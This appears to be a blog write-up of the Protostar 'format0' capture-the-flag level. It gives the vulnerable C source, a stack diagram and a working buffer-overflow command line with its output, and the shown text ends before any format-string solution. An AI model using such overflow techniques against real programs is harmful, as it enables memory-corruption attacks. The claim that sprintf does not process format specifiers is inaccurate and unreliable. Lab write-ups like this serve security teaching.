---
layout: single
title: "Protostar - Uncontrolled Format String Challenges 0-4"
toc: true
toc_label: "Table of Contents"
toc_sticky: true
---

Protostar’s format string challenges are super fun! I spent hours diving into them, trying to really understand how they work. In this blog, I want to share what I’ve learned, including my approach, techniques, and little tricks that helped me along the way. Hope you all enjoy it!

## Format 0

Description

>This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
>
>Hints
>
>- This level should be done in less than 10 bytes of input.
>- “Exploiting format string vulnerabilities”
>
>This level is at /opt/protostar/bin/format0

Source Code

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Looking at the source code, we can see that it takes a command line argument and passes it to the **vuln()** function. Inside this function, the target variable is initially set to 0, and if we can change it to ***"0xdeadbeef"***, we complete the level.

Before solving the challenge, let’s take a look at how the stack is structured when we execute the binary:

```shell
|      .....      |  <--------- Higher address
|-----------------|
|       EBP       | 
|-----------------|
|      target     |  
|-----------------|
|      buffer     | 
|-----------------|
|      .....      |  <--------- Lower address
|-----------------|
```

From this stack layout, we can see that the vulnerability comes from <a href="https://cplusplus.com/reference/cstdio/sprintf/" target="_blank">sprintf()</a>, where we can overwrite the **target** variable through **buffer**. 

The call to **sprintf()** is vulnerable to a buffer overflow because it doesn’t check the size of our input. Additionally, it’s also vulnerable to a format string vulnerability since it doesn’t handle format specifiers like <a href="https://cplusplus.com/reference/cstdio/printf/" target="_blank">printf()</a> does.

### Buffer Overflow Solution

Since we are provided the source, we can easily see that **target** and **buffer** are located next to each other. This means we can exploit the program by filling the 64-byte buffer with 'A's and then overwriting target with ***"0xdeadbeef"*** in little-edian format.

Here is my exploit using Buffer Overflow:

```shell
user@protostar:/opt/protostar/bin$ ./format0 $(python -c 'print "A" * 64 + "\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

However, our input exceeds 10 bytes, and we haven’t even used the Format String Vulnerability yet. Luckily, we can take advantage of the <a href="https://en.wikipedia.org/wiki/Printf#Width_field" target="_blank">width field</a> in format strings to complete this level!

